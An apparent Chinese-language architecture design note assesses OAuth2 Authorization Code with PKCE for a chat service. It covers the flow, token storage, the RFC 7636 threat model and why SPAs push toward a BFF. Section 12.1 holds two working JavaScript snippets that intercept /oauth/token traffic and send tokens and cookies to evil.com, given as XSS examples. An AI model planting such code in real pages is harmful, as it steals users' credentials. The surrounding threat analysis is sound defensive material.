# 方案 F:OAuth2 Authorization Code + PKCE

> 返回 [索引](./跨服务鉴权方案分析.md)
> 横向跳转:[A](./方案A-独立账号.md) · [B](./方案B-对称密钥前端持JWT.md) · [C](./方案C-对称密钥Cookie兜底.md) · [D](./方案D-非对称密钥JWKS.md) · [E](./方案E-TokenExchange.md) · **F** · [G](./方案G-BFF会话.md) · [H](./方案H-API网关验签.md)

---

## 1. 业界现状(2024+)

**这是浏览器 SPA 鉴权的现代标准**,由 IETF OAuth Working Group 在 RFC 6749 + RFC 7636 + [Browser-Based Apps 草案](https://datatracker.ietf.org/doc/draft-ietf-oauth-browser-based-apps/) 中定义。

- Google / Microsoft / GitHub / Slack 等几乎所有大厂的 SSO 都基于此协议
- 国内腾讯云 CIAM / 阿里云 IDaaS / 字节火山 IAM 都是 OAuth2/OIDC 实现
- 开源 IdP:**Keycloak**(企业标准)、**Hydra**(轻量)、**Authentik**(新)

## 2. 角色拆分

```
┌──────────┐                ┌──────────────────┐
│ Browser  │                │  Identity        │
│ (Client) │ ───────────────│  Provider (IdP)  │
└──────────┘                │  Keycloak/Auth0  │
     │                      └──────────────────┘
     │                              │
     │  access token (Bearer)       │  签发
     ▼                              ▼
┌─────────────────┐             ┌─────────────────┐
│  our-chat       │             │  agent-server   │
│  Resource Server│             │  Resource Server│
└─────────────────┘             └─────────────────┘
```

- **Client**:浏览器内 SPA(public client,无客户端密钥)
- **Identity Provider**:独立的鉴权服务(用户存这里,登录页这里)
- **Resource Server**:our-chat 后端 + agent-server,都只是消费 IdP 签的 token

## 3. Authorization Code Flow with PKCE 概览

PKCE = Proof Key for Code Exchange,防止公开客户端被人偷 authorization code。

```
① 前端生成 code_verifier(随机 43-128 字符)
② code_challenge = SHA256(code_verifier) base64url 编码
③ 浏览器跳转 IdP /authorize?
     response_type=code
     &client_id=<spa>
     &redirect_uri=<spa-callback>
     &code_challenge=<S256 hash>
     &code_challenge_method=S256
     &state=<random>           # 防 CSRF
     &scope=openid profile agent-server

④ 用户在 IdP 登录页认证

⑤ IdP 重定向回 SPA:?code=<auth-code>&state=<echo>

⑥ SPA POST IdP /token:
     grant_type=authorization_code
     &code=<auth-code>
     &code_verifier=<原始 verifier>     # 关键:用原值证明你是发起者
     &client_id=<spa>
     &redirect_uri=<spa-callback>

⑦ IdP 验证:
     SHA256(verifier) === stored challenge ?
     返回 { access_token, refresh_token, id_token }

⑧ SPA 用 access_token 调 our-chat / agent-server
```

**PKCE 是给"不能保密 client_secret"的 SPA 设计的**——没有 PKCE 时,中间人偷到 auth code 就能换 token;有 PKCE 后,偷 code 没用,因为攻击者没有 verifier。

## 4. Token 类型

| Token | 用途 | 通常 TTL | 存哪 |
|---|---|---|---|
| access_token | 调资源服务器的 Bearer | 5–60 min | 内存(避免 XSS) |
| refresh_token | 换新 access_token | 数小时–数天 | HttpOnly cookie(避免 XSS) |
| id_token(OIDC) | 用户身份凭证(给 client 看的) | = access_token | 内存 |

## 5. 实现路径(本项目)

引入轻量 IdP(Hydra 或自建 NestJS OAuth2 server):

1. 用户访问 our-chat web → 跳转 IdP `/authorize`
2. IdP 登录页(用户认证)→ 回调 SPA with code
3. SPA 经 PKCE 换 access_token + refresh_token
4. SPA 同时调 our-chat 和 agent-server,都塞同一 access_token
5. 两个 resource server 都经 JWKS 验证

**工作量**:中等。需要起 IdP 进程、改造 our-chat 登录、agent-server 加 JWKS。

## 6. 优劣

| 优 | 劣 |
|---|---|
| 行业标准,简历级亮点 | 需要起独立 IdP(K8s 多一个 Deployment) |
| 第三方集成天然支持(Open ID Connect) | 学习曲线陡 |
| 单点登录,Mobile / Web / 桌面客户端可共用 | 实现复杂度对单产品而言过度 |
| 支持细粒度权限范围(scope) | dev 联调需要 IdP 在线 |

## 7. 适用场景

- 中长期项目,有第三方集成 / 多产品矩阵规划
- 安全合规审计要求(SOC 2 / GDPR 等)
- 校招 portfolio 想展示"懂 OAuth2"——这是最显工程深度的方案

## 8. 简化变体(本项目可考虑)

不引入独立 IdP,而是**让 our-chat 后端兼任 IdP**:

- our-chat 暴露 `/oauth/authorize` + `/oauth/token`
- agent-server 是 resource server,经 JWKS 验
- 前端走完整 PKCE 流(POST `/oauth/token`)

这是"OAuth2 但少一个进程"的工程折中,概念完全标准,工作量降一半。

## 9. 深入:PKCE 流程精确化(时序图)

§3 给了概览,但 PKCE 安全模型的细节藏在每一步的**数据流向**里。逐步对照:

```
                       客户端                          IdP
                         │                              │
   ① 生成 code_verifier  │                              │
      = randomBytes(64)  │                              │
      base64url 编码     │  ★ 只存客户端进程内存         │
                         │                              │
   ② code_challenge      │                              │
      = SHA256(verifier) │                              │
      base64url          │                              │
                         │                              │
   ③ 浏览器跳转          │                              │
                         │  GET /authorize              │
                         │    ?code_challenge=<S256>    │
                         │    &code_challenge_method=S256
                         │    &state=<random>           │
                         │    &redirect_uri=...         │
                         │ ────────────────────────────►│
                         │                              │ ④ IdP 存下 challenge,
                         │                              │   与本次 authorization session 绑定
                         │                              │   (verifier IdP 看不到,只看到 hash)
                         │                              │
                         │   302 redirect               │
                         │   ?code=AUTH_CODE            │
                         │   &state=<echo>              │
                         │ ◄────────────────────────────│
                         │                              │
   ⑤ 验 state(防 CSRF) │                              │
                         │                              │
   ⑥ POST /token         │                              │
                         │  grant_type=auth_code        │
                         │  &code=AUTH_CODE             │
                         │  &code_verifier=<原值>       │ ◄── 关键:verifier 不经 redirect 链路,
                         │ ────────────────────────────►│      直接 POST,中间人看不到
                         │                              │
                         │                              │ ⑦ IdP 校验:
                         │                              │   SHA256(received_verifier) === stored challenge?
                         │                              │   ✓ 通过 → 签发
                         │                              │
                         │  { access_token, refresh_token, id_token }
                         │ ◄────────────────────────────│
                         │                              │
   ⑧ verifier 销毁       │                              │
   ⑨ token 存 Keychain  │                              │
      / 内存 / cookie    │                              │
```

**关键不变量(invariants)**:

| 数据 | 在哪 | 谁能看 | 安全前提 |
|---|---|---|---|
| `code_verifier`(原文) | 客户端进程内存 | 客户端代码 | **客户端进程不被攻陷** |
| `code_challenge`(hash) | URL / IdP 数据库 | 所有人(可拦截) | 哈希不可逆即可 |
| `authorization code` | URL / IdP 数据库 | 拦截者可读 | **拦截者拿不到 verifier** |
| `access_token` | HTTPS body / 客户端存储 | 客户端代码 | 客户端进程 + 存储介质安全 |

**PKCE 的精髓**:把"拦截 code"和"拿 token"解耦——单独拿 code 没用,必须同时持有 verifier 才能完成换 token。**这个安全保证只在 verifier 不泄漏的前提下成立。**

## 10. PKCE 真正防什么:RFC 7636 威胁模型

PKCE(RFC 7636)在 §1 明确写了威胁模型:

> *"A malicious application that has registered the same redirect URI scheme can intercept the authorization code."*

具体三个攻击向量:

| 攻击 | 场景 | 没 PKCE 后果 | 有 PKCE 后果 |
|---|---|---|---|
| **Native URL scheme 抢注** | Android 恶意 app 注册了 `myapp://` 这个 scheme,系统不知道选哪个,可能跳到恶意 app | 恶意 app 拿到 code,换走 token | 拿到 code 也没用,没 verifier 换不到 token |
| **Log / Referer 泄漏** | 中间件把 redirect URL 写日志,或浏览器 Referer 头透传到第三方 | 日志读取者 / 第三方拿到 code | 同上 |
| **同设备恶意进程** | 设备上别的 app 监听了 redirect / 抓包 | 拿到 code | 同上 |

**PKCE 防的是"redirect 链路上的 code 拦截",不防"客户端进程本身被攻陷"。** 这是协议有意划定的边界。

## 11. 安全前提:verifier 的可信度依赖

PKCE 不防"客户端进程内代码被攻陷"。一旦攻陷,以下全部失守:

| 攻击者能拿到 | 后果 |
|---|---|
| `code_verifier` | 重放 PKCE 流换 token,完全绕过 |
| `access_token` | 直接调 resource server,所有用户数据可读可写 |
| `refresh_token` | 永久续期 token,撤销 + 用户改密码都难止血 |
| 操控 `state` | 绕过 CSRF 保护,可发起冒名授权 |

**任何加密协议都需要一个"信任根"。** PKCE 把信任根设定在:

> **客户端进程内存中的 verifier 在几秒到几十秒的窗口期内不会被同进程恶意代码读到。**

这个假设的可信度取决于客户端类型——这是 OAuth WG 2020–2024 反复检讨的根本问题:

| 客户端 | 进程隔离 | XSS 风险 | 信任根可信度 |
|---|---|---|---|
| Native App(iOS/Android) | OS sandbox + Keychain/Keystore | 无 | **高** |
| Desktop App(Electron) | 进程独立,但常加载 npm 依赖 | 中(取决于内嵌内容) | 中 |
| **Browser SPA** | **同 origin 内所有 JS 共享进程** | **高** | **低** |
| 嵌入式 / IoT | 取决于设备 | 取决于固件 | 不一定 |

**SPA 是 PKCE 信任根最弱的环境。** 这是 OAuth WG 转推 BFF 模式([方案 G](./方案G-BFF会话.md))的根本动因。

## 12. SPA 上,PKCE 实际怎么被攻破

不是抽象担忧,有具体攻击路径:

### 12.1 XSS 直接读 verifier / token

```js
// 注入到 SPA 的恶意 JS(任何形式的 XSS 注入都行):
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.name.includes('/oauth/token')) {
      fetch('https://evil.com/leak', {
        method: 'POST',
        body: JSON.stringify({ url: entry.name, cookies: document.cookie }),
      });
    }
  }
});
observer.observe({ entryTypes: ['resource'] });
```

或者更简单——**直接 monkey-patch `fetch`**:

```js
const origFetch = window.fetch;
window.fetch = async function (...args) {
  const res = await origFetch.apply(this, args);
  const clone = res.clone();
  if (args[0].includes('/oauth/token')) {
    const body = await clone.json();
    navigator.sendBeacon('https://evil.com', JSON.stringify(body));
  }
  return res;
};
```

**SPA 一旦被注入,PKCE / token / cookie 全完——不论 token 存 localStorage、内存、还是 non-HttpOnly cookie,都在同一个 JS 上下文里,攻击者无差别访问。**

### 12.2 第三方依赖投毒(供应链攻击)

历史上真实发生过的事件:

| 事件 | 时间 | 影响 |
|---|---|---|
| `event-stream` 包注入挖矿 | 2018 | 数百万下载,bitcoin 钱包凭证泄漏 |
| `ua-parser-js` 投毒 | 2021 | 周下载量 800 万,密码窃取 + 挖矿 |
| `@solana/web3.js` 投毒 | 2024 | 加密钱包私钥泄漏 |
| 多个 Chrome 扩展被卖给恶意方 | 持续 | 用户访问的所有页面被注入 |

这些**都在 SPA origin 的同进程里跑**,跟你的应用代码无差别访问 verifier / token。CSP 能缓解但不能根治(`script-src 'self'` 防不住已经被注入到你 bundle 里的恶意代码)。

### 12.3 浏览器扩展 / 开发者工具

- 用户装的扩展能读你页面所有 DOM 和网络请求
- Service Worker(同 origin 注册后)可以拦截全部 fetch
- 开发者工具 → Network 面板能看到所有 token 流转(社工攻击可诱导用户截图分享)

**这些都不是 PKCE 能防的范畴。**

## 13. Native 上 PKCE 为什么相对可靠

| 维度 | Web SPA | Native (iOS/Android) |
|---|---|---|
| 同进程读内存 | XSS / 恶意依赖 / 扩展能读 | **OS sandbox 隔离**,别的 App 读不到你进程内存 |
| token 持久化存储 | localStorage / cookie 都不抗 XSS | **Keychain / Keystore**,系统级加密 + 进程绑定 |
| 代码注入 | npm 投毒 / 第三方 SDK / 扩展 | App Store / Play Store 签名审核 |
| 调试器访问 | 任何用户 F12 即可 | Production build 关 LLDB / JDWP |
| 网络拦截 | 用户级证书可装 | iOS 13+ 必须用户主动信任 + Android Network Security Config |

**Native 上 verifier / token 的"信任根"由操作系统保证。** PKCE 在 Native 上是协议设计的"主场",安全模型完整成立。

## 14. 真正治本的方案:BFF

PKCE 在 SPA 上的根本困境,催生了 OAuth WG 2024+ 草案 `draft-ietf-oauth-browser-based-apps` 的反向推荐:**SPA 不应直接持有 token**。

- token 全部留在 BFF 服务端
- SPA 与 BFF 之间用传统 HttpOnly session cookie
- BFF 用 PKCE 跟 IdP 拿 token,代理转发给 resource server

这就把"verifier / token 在 JS 内存"这个最弱信任根**彻底搬走**——SPA 端只能拿到 session cookie,JS 完全读不到 OAuth token。XSS 即使发生,攻击者也只能"通过 BFF 调 resource server"(可经 BFF 端做异常检测 / 限流 / 审计),而不能直接持 token 跑路。

详见 [方案 G](./方案G-BFF会话.md) 完整分析。

## 15. 小结:你需要记住的三件事

1. **PKCE 防的是 redirect 链路拦截,不防客户端进程攻陷。** 这是协议有意划定的安全边界。
2. **verifier 的可信度由客户端运行环境决定。** Native 上系统级保证,SPA 上 XSS / 供应链全裸。
3. **SPA + 长期 token + 直接持有 = 高风险组合。** 业界 2024+ 主流答案是 BFF(把 token 搬到服务端 session 后)+ 短 expiry + token rotation。

---

## 横向关联

- **跟 [方案 D](./方案D-非对称密钥JWKS.md) 的关系**:F 内部就用 JWKS 做 token 验签,D 是 F 的"密钥子系统"被提前单独使用
- **跟 [方案 E](./方案E-TokenExchange.md) 的关系**:E 是 F 生态里的一种 grant type
- **跟 [方案 G](./方案G-BFF会话.md) 的关系**:G 是 F 在 SPA 上的"安全加固版"——把 token 从 JS 搬到 BFF
- **跟 [方案 B](./方案B-对称密钥前端持JWT.md) 的关系**:B 本质是 F 的极简化版,演进到 F 路径最自然
